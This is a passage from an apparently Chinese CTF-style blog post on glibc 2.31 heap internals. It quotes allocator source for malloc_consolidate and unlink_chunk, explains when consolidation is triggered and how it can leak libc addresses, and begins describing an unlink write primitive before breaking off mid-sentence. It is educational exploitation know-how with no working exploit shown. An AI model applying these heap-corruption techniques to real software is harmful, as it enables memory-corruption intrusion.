class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  可以看到，其整体逻辑还是非常简单的——其会遍历<strong>fast bin</strong>链上的每一个chunk，如果chunk的<strong>prev_inuse</strong>为0，则<strong>prev bin</strong>(物理相连的低地址chunk)是空闲的，则将其从双向链表上<strong>unlink</strong>下来(如果pre_inuse为0，则必然不可能是<strong>fast bin</strong>或<strong>tcache</strong>类型，则其通过双向链表进行管理的)，并进行合并;如果其<strong>next bin</strong>(物理相连的高地址chunk)是<strong>top chunk</strong>，则直接合并进入<strong>top chunk</strong>中;类似于<strong>prev bin</strong>的合并，如果其<strong>nextinuse</strong>为0，则<strong>next bin</strong>是空闲的chunk，同样将其从双向链表上<strong>unlink</strong>下来并合并，最后将合并后的chunk插入到<strong>unsorted_bin</strong>和<strong>unsorted_bin-&gt;fd</strong>之间即可。</p><p>  因此，如果题目中限制了申请内存的大小，但是又给了调用<strong>malloc_consolidate</strong>的机会。则可以通过将这些<strong>fast bin</strong>的chunk进行合并，从而获取一个位于<strong>unsorted bin</strong>的chunk，进而可以方便的泄漏libc的地址</p><h3 id="被调用位置"><a href="#被调用位置" class="headerlink" title="被调用位置"></a>被调用位置</h3><p>  只有了解什么时候<strong>malloc_consolidate</strong>函数会被调用，我们才能正确的利用<strong>malloc_consolidate</strong>，避免在想要调用<strong>malloc_consolidate</strong>的时候没有触发调用，再不该调用<strong>malloc_consolidate</strong>反而触发了，影响堆中的chunk布局</p><p>  通过在glibc2.31版本的源代码中的索引，可以归纳出如下几个位置会调用<strong>malloc_consolidate</strong></p><ol><li>在分配内存时，申请的内存大小超出<strong>small bin</strong>的范围，其上下文代码如下所示<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>在分配内存时，当最后top chunk同样不能满足请求时，其也会调用malloc_consolidate，上下文代码如下所示<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>在释放内存时，没有被释放进fast bin或unsorted bin链中，非mmapped方式分配的内存，且其chunk大小足够大，则在释放完成后，会再次调用malloc_consolidate，其上下文如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">     have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!have_lock)</span><br><span class="line">     __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">   free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">     prevsize = prev_size (p);</span><br><span class="line">     size += prevsize;</span><br><span class="line">     p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">       malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">     unlink_chunk (av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink_chunk (av, nextchunk);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">     consolidate into top</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">     size += nextsize;</span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     av-&gt;top = p;</span><br><span class="line">     check_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">     chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">     threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">     bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">     has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">     don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">     consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">     is reached.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure><p>可以看到，如果要想使用<strong>malloc_consolidate</strong>，其境况就是我们无法申请大内存，因此情况1基本不会出现;而如果我们申请的都是小内存，则基本很难将top chunk申请完，则情况2也很难出现。因此，在题目中如果想要用到<strong>malloc_consolidate</strong>，基本就是通过情况3</p></li></ol><h2 id="unlink攻击"><a href="#unlink攻击" class="headerlink" title="unlink攻击"></a>unlink攻击</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><p>  这里给出glibc2.31版本的<strong>unlink</strong>，之前是以宏的形式存在的，并且比之前多了一些检查，但是没有太大的影响<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  一般在题目中，我们操作的chunk大小都是位于<strong>small bin</strong>范围内。因此，理论上，如果我们可以控制<code>p</code>的fd和bk字段，将上述代码进行一定的简化，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure></p><p>  其会将<code>fd + SIZE_SZ * 3</code>地址处的值设置为<strong>bk</strong>;会将<code>bk + SIZE_SZ * 